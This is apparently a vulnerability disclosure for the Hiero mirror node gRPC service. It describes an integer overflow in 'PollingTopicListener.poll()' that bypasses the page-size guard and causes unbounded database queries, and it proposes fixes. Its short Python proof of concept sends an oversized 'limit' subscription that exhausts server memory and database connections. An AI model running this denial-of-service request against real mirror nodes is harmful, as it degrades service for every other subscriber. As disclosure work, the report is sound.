### Title
Integer Overflow in `PollingTopicListener.poll()` Bypasses `maxPageSize` Guard, Causing Unlimited Database Queries

### Summary
In `PollingTopicListener.poll()`, the expression `(int)(filter.getLimit() - context.getCount().get())` silently overflows to a negative integer when a user supplies a `limit` value greater than `Integer.MAX_VALUE` (2,147,483,647) via the gRPC `uint64 limit` field. `Math.min()` then selects the negative value as `pageSize`, which is stored in `newFilter`. Because `TopicMessageFilter.hasLimit()` returns `false` for any non-positive value, `findByFilter` calls `typedQuery.setMaxResults()` zero times, issuing an unbounded SQL query to the database on every poll cycle.

### Finding Description

**Code path:**

`ConsensusController.toFilter()` maps the raw proto `uint64 limit` directly to `TopicMessageFilter.limit` (a Java `long`) with no upper-bound check: [1](#0-0) 

The only validation on `TopicMessageFilter.limit` is `@Min(0)`, which permits any non-negative `long`, including values > `Integer.MAX_VALUE`: [2](#0-1) 

`TopicMessageServiceImpl.incomingMessages()` computes the remaining limit as a `long` (no overflow here) and passes it to `topicListener.listen()`: [3](#0-2) 

Inside `PollingTopicListener.poll()`, the remaining `long` is **narrowed to `int`** before `Math.min`: [4](#0-3) 

With `filter.getLimit() = 3_000_000_000L` and `count = 0`:
- `(int)(3_000_000_000L - 0L)` → `-1_294_967_296` (int overflow)
- `Math.min(-1_294_967_296, 5000)` → `-1_294_967_296`
- `newFilter.limit = -1_294_967_296L`

In `TopicMessageRepositoryCustomImpl.findByFilter()`, `hasLimit()` checks `limit > 0`, which is `false` for the negative value, so `setMaxResults()` is never called: [5](#0-4) [6](#0-5) 

The JPA query therefore has no `LIMIT` clause and returns every matching row in the topic.

### Impact Explanation

Every poll cycle (default: every 500 ms) issues a full-table scan for the topic with no row limit. The `maxPageSize = 5000` guard is completely bypassed. A topic with millions of messages causes the server to load all of them into memory on each tick, exhausting heap and database connection resources. This is a server-side Denial-of-Service: the attacker's single persistent gRPC subscription can degrade or crash the mirror node for all other subscribers. The outer `flux.take(filter.getLimit())` in `TopicMessageServiceImpl` (line 84) limits records sent to the client but does not prevent the repeated unlimited DB queries. [7](#0-6) 

### Likelihood Explanation

**Precondition:** The server must be configured with `hiero.mirror.grpc.listener.type = POLL`. This is not the default (`REDIS`), but it is a documented and supported mode. [8](#0-7) 

**Trigger:** Any unauthenticated gRPC client sends one `subscribeTopic` request with `limit` set to any value in the range `(Integer.MAX_VALUE, Long.MAX_VALUE]` — e.g., `limit = 3000000000`. The proto field is `uint64`, so this is a fully legal value: [9](#0-8) 

No authentication, no special role, and no prior knowledge of the system is required beyond knowing the topic ID.

### Recommendation

1. **Add an upper-bound check** in `PollingTopicListener.poll()` before the cast:
   ```java
   long remaining = filter.getLimit() - context.getCount().get();
   int limit = remaining > listenerProperties.getMaxPageSize()
           ? listenerProperties.getMaxPageSize()
           : (int) remaining;
   int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
   ```
2. **Add `@Max(Integer.MAX_VALUE)` or a custom constraint** to `TopicMessageFilter.limit` to reject oversized values at the validation boundary.
3. Apply the same fix to the identical pattern in `PollingTopicMessageRetriever.poll()` (line 68–71), which has the same cast. [10](#0-9) 

### Proof of Concept

```python
import grpc
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2, timestamp_pb2

channel = grpc.insecure_channel("mirror-node-host:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

query = consensus_service_pb2.ConsensusTopicQuery(
    topicID=basic_types_pb2.TopicID(topicNum=12345),
    consensusStartTime=timestamp_pb2.Timestamp(seconds=0),
    limit=3_000_000_000,   # > Integer.MAX_VALUE; passes @Min(0) validation
)

# Each poll cycle now issues SELECT * FROM topic_message WHERE topic_id=12345
# ORDER BY consensus_timestamp  -- with NO LIMIT clause
for response in stub.subscribeTopic(query):
    pass  # keep subscription alive; server hammers DB every 500ms
```

**Expected result (POLL mode):** Server-side heap and DB connection exhaustion as unlimited result sets are loaded on every poll interval. Other subscribers experience degraded latency or connection failures.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L55-57)
```java
    private TopicMessageFilter toFilter(ConsensusTopicQuery query) {
        final var filter = TopicMessageFilter.builder().limit(query.getLimit());

```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L25-26)
```java
    @Min(0)
    private long limit;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L39-41)
```java
    public boolean hasLimit() {
        return limit > 0;
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L83-85)
```java
        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L115-118)
```java
        long limit =
                filter.hasLimit() ? filter.getLimit() - topicContext.getCount().get() : 0;
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(limit).startTime(startTime).build();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L54-59)
```java
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/repository/TopicMessageRepositoryCustomImpl.java (L51-53)
```java
        if (filter.hasLimit()) {
            typedQuery.setMaxResults((int) filter.getLimit());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L36-43)
```java
    @NotNull
    private ListenerType type = ListenerType.REDIS;

    public enum ListenerType {
        POLL,
        REDIS,
        SHARED_POLL
    }
```

**File:** protobuf/src/main/proto/com/hedera/mirror/api/proto/consensus_service.proto (L25-25)
```text
    uint64 limit = 4;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L68-71)
```java
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
```
